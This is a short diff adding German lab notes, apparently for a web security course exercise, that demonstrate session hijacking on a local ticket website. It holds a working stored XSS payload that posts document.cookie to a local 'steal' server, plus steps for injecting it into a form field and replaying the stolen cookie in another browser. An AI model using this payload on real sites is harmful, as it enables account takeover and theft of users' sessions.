@@ -1,0 +1,22 @@
+<script>
+  fetch("http://127.0.0.1:5005/steal", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({cookie: document.cookie})
+  });
+</script>
+
+
+Schritt1: Server starten für Ticket-Website
+Schritt2: 2. Server stealCookieServer.py starten in extra Fenster
+Schritt3: Einloggen als matthias in Chrome und Payload in title-Formularfeld einfügen
+Schritt4: terminal checken in stealCookieServer.py checken und Cookie abgreifen
+Schritt5: Website in Inkognito oder Firefox öffnen --> schauen dass unangemeldet --> dann untersuchen und unter Application bzw. Webspeicher(Firefox) Cookie einsetzen
+Schritt6: Zeigen dass eingeloggt
+
+will er eigentlich als gehashter cookie klauen
+und dann einfügen über untersuchen
+
+eine der nächten aufgaben wird sein:
+hash von cookie hat einen punkt 
+--> der teil nach dem punkt zu cracken wird eine der nächte aufgabe sein !!
